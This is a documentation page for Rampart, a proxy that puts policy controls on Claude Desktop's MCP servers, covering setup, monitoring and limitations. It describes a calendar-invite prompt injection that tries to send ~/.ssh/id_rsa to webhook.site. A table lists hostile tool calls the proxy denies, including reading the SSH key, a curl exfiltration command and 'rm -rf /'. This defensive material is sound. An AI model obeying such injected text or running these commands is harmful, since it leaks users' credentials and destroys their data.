---
title: Securing Claude Desktop
description: "Protect Claude Desktop MCP tool access with Rampart. Enforce guardrails on filesystem and API actions, and reduce prompt injection-driven exfiltration."
---

# Claude Desktop

Claude Desktop can use MCP servers for filesystem access, databases, APIs, and
more. Rampart evaluates the MCP servers you explicitly route through its local
proxy; built-in and directly connected tools remain outside that boundary.

## The Threat

Claude Desktop processes content from emails, documents, calendar invites, and web pages. Any of these can contain hidden instructions ([prompt injection](https://simonwillison.net/series/prompt-injection/)) that hijack Claude's behavior.

**Example attack:** A calendar invite contains hidden text telling Claude to
read `~/.ssh/id_rsa` and send it to `webhook.site`. If both requested tools are
proxied and match the standard policy, Rampart denies and logs those requests.

## Setup

### 1. Find Your Config

Claude Desktop's MCP config lives at:

| Platform | Path |
|----------|------|
| macOS | `~/Library/Application Support/Claude/claude_desktop_config.json` |
| Linux | `~/.config/Claude/claude_desktop_config.json` |
| Windows | `%APPDATA%\Claude\claude_desktop_config.json` |

### 2. Wrap Your MCP Servers

Replace each MCP server command with `rampart mcp --`:

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "rampart",
      "args": ["mcp", "--", "npx", "-y", "@modelcontextprotocol/server-filesystem", "/Users/you/Documents"]
    },
    "github": {
      "command": "rampart",
      "args": ["mcp", "--", "npx", "-y", "@modelcontextprotocol/server-github"],
      "env": {
        "GITHUB_TOKEN": "ghp_..."
      }
    }
  }
}
```

### 3. Restart Claude Desktop

Quit and reopen. Your MCP servers now route through Rampart.

## What Gets Protected

With the standard policy:

| Attack | Tool Call | Result |
|--------|-----------|--------|
| Credential theft | `read_file("~/.ssh/id_rsa")` | **Denied** |
| Data exfiltration | `execute("curl webhook.site")` | **Denied** |
| Destructive command | `execute("rm -rf /")` | **Denied** |
| Normal file read | `read_file("report.pdf")` | Allowed |
| Normal command | `execute("git status")` | Allowed |

## Local vs Cloud MCP Servers

- **Local servers:** A denied proxied request is stopped before the server sees
  it. Behavior inside an allowed server call is not inspected.
- **Cloud servers:** Rampart blocks requests before they leave your machine. Allowed calls execute remotely.

For cloud MCP servers, use a more restrictive policy (deny by default, explicit allowlist).

## Ask Behavior

The standalone stdio proxy has no safely reachable approval resolver. When a
policy action is `ask`, it fails closed immediately and returns a JSON-RPC error
to Claude Desktop with code `-32600`. Use explicit `allow` or `deny` rules until
a service-backed exact-call approval owner is configured.

## Monitor

```bash
rampart watch
rampart audit tail --follow
```

## Limitations

- **Built-in tools** (like Claude's code interpreter) don't go through MCP and can't be intercepted.
- **Already-compromised context:** If prompt injection happened in a previous turn, Claude may try alternative approaches when blocked.

See the full [Claude Desktop security guide](https://github.com/peg/rampart/blob/main/docs/guides/securing-claude-desktop.md) for more details.
